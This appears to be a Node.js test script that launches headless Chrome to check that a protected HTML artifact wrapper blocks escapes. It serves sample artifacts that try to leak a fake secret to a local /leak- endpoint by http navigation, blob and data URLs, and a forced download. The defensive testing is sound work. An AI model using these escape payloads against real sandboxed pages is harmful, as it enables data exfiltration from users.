#!/usr/bin/env node

import { spawn } from 'node:child_process'
import { createServer } from 'node:http'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import {
  artifactDownloadBridgeSource,
  buildProtectedArtifactWrapperDocument,
} from '../src/lib/protected-artifact-wrapper.mjs'
import {
  CdpClient,
  chromeExecutable,
  waitForWebSocketUrl,
} from './measure-html-artifacts.mjs'

function artifactDocument(script, body = '') {
  return `<!doctype html><html><head><meta charset="utf-8"></head><body>${body}<script>${script}</script></body></html>`
}

async function navigateCase(client, sessionId, url) {
  const loaded = client.waitFor('Page.loadEventFired', sessionId)
  await client.send('Page.navigate', { url }, sessionId)
  await loaded
  await new Promise((resolve) => setTimeout(resolve, 750))
}

async function main() {
  const executable = chromeExecutable()
  if (!executable) throw new Error('Chrome was not found for the protected-artifact sandbox guard.')

  const leakRequests = []
  let baseUrl = ''
  const bridge = artifactDownloadBridgeSource()
  const wrapperFactories = {
    http: () => buildProtectedArtifactWrapperDocument(artifactDocument(
      `window.parent.postMessage({type:'pathforge-artifact-size',width:100,height:100},'*'); location.href=${JSON.stringify(`${baseUrl}/leak-http?secret=abc`)};`,
    )),
    blob: () => {
      const escapeDocument = `<script>fetch(${JSON.stringify(`${baseUrl}/leak-blob?secret=abc`)})<\/script>`
      return buildProtectedArtifactWrapperDocument(artifactDocument(
        `window.parent.postMessage({type:'pathforge-artifact-size',width:100,height:100},'*'); const escapeUrl=URL.createObjectURL(new Blob([${JSON.stringify(escapeDocument)}],{type:'text/html'})); location.href=escapeUrl;`,
      ))
    },
    data: () => {
      const escapeDocument = `<script>fetch(${JSON.stringify(`${baseUrl}/leak-data?secret=abc`)})<\/script>`
      return buildProtectedArtifactWrapperDocument(artifactDocument(
        `window.parent.postMessage({type:'pathforge-artifact-size',width:100,height:100},'*'); location.href=${JSON.stringify(`data:text/html,${encodeURIComponent(escapeDocument)}`)};`,
      ))
    },
    download: () => buildProtectedArtifactWrapperDocument(artifactDocument(
      `${bridge}; const external=document.createElement('a'); external.download='stolen.txt'; external.href=${JSON.stringify(`${baseUrl}/leak-download?secret=abc`)}; document.body.append(external); external.click();`,
    )),
    safe: () => buildProtectedArtifactWrapperDocument(artifactDocument(
      `${bridge}; document.getElementById('safe').addEventListener('click',()=>{ const url=URL.createObjectURL(new Blob(['safe export'],{type:'text/plain'})); const link=document.createElement('a'); link.download='safe.txt'; link.href=url; document.body.append(link); link.click(); URL.revokeObjectURL(url); link.remove(); });`,
      '<button id="safe" style="position:fixed;left:20px;top:20px;width:140px;height:48px">Safe export</button>',
    )),
  }

  const server = createServer((request, response) => {
    const url = new URL(request.url ?? '/', baseUrl)
    if (url.pathname.startsWith('/leak-')) {
      leakRequests.push(url.pathname)
      response.writeHead(204).end()
      return
    }
    const name = url.pathname.replace(/^\//, '') || 'http'
    const wrapperFactory = wrapperFactories[name]
    if (!wrapperFactory) {
      response.writeHead(404).end('not found')
      return
    }
    response.writeHead(200, {
      'content-type': 'text/html; charset=utf-8',
      'cache-control': 'no-store',
    })
    response.end(wrapperFactory())
  })
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve))
  const address = server.address()
  if (!address || typeof address === 'string') throw new Error('Sandbox guard server did not bind.')
  baseUrl = `http://127.0.0.1:${address.port}`

  const profile = mkdtempSync(path.join(tmpdir(), 'pathforge-artifact-sandbox-'))
  const child = spawn(executable, [
    '--headless=new',
    '--disable-gpu',
    '--no-sandbox',
    '--remote-debugging-port=0',
    `--user-data-dir=${profile}`,
    'about:blank',
  ], { stdio: ['ignore', 'ignore', 'pipe'] })

  let client
  try {
    client = new CdpClient(await waitForWebSocketUrl(child))
    await client.ready()
    const { targetId } = await client.send('Target.createTarget', { url: 'about:blank' })
    const { sessionId } = await client.send('Target.attachToTarget', { targetId, flatten: true })
    await Promise.all([
      client.send('Page.enable', {}, sessionId),
      client.send('Runtime.enable', {}, sessionId),
    ])

    for (const name of ['http', 'blob', 'data', 'download']) {
      await navigateCase(client, sessionId, `${baseUrl}/${name}`)
    }
    if (leakRequests.length > 0) {
      throw new Error(`Protected artifact escaped through: ${leakRequests.join(', ')}`)
    }

    await navigateCase(client, sessionId, `${baseUrl}/safe`)
    const { result: loadedResult } = await client.send('Runtime.evaluate', {
      expression: `document.getElementById('pathforge-artifact-document')?.dataset.pathforgeLoaded ?? ''`,
      returnByValue: true,
    }, sessionId)
    if (loadedResult.value !== 'true') {
      throw new Error('Protected artifact inner frame did not load.')
    }
    await client.send('Input.dispatchMouseEvent', {
      type: 'mousePressed',
      x: 90,
      y: 44,
      button: 'left',
      clickCount: 1,
    }, sessionId)
    await client.send('Input.dispatchMouseEvent', {
      type: 'mouseReleased',
      x: 90,
      y: 44,
      button: 'left',
      clickCount: 1,
    }, sessionId)
    await new Promise((resolve) => setTimeout(resolve, 350))
    const { result: forwardedResult } = await client.send('Runtime.evaluate', {
      expression: `document.getElementById('pathforge-artifact-document')?.dataset.lastForwardedType ?? ''`,
      returnByValue: true,
    }, sessionId)
    if (forwardedResult.value !== 'pathforge-artifact-download') {
      throw new Error('Bounded blob download did not traverse the protected bridge.')
    }

    await client.send('Target.closeTarget', { targetId })
  } finally {
    client?.close()
    child.kill('SIGTERM')
    await new Promise((resolve) => server.close(resolve))
    rmSync(profile, { recursive: true, force: true, maxRetries: 8, retryDelay: 125 })
  }

  console.log('Protected artifact sandbox navigation and download guard passed.')
}

main().catch((error) => {
  console.error(error instanceof Error ? error.message : String(error))
  process.exit(1)
})
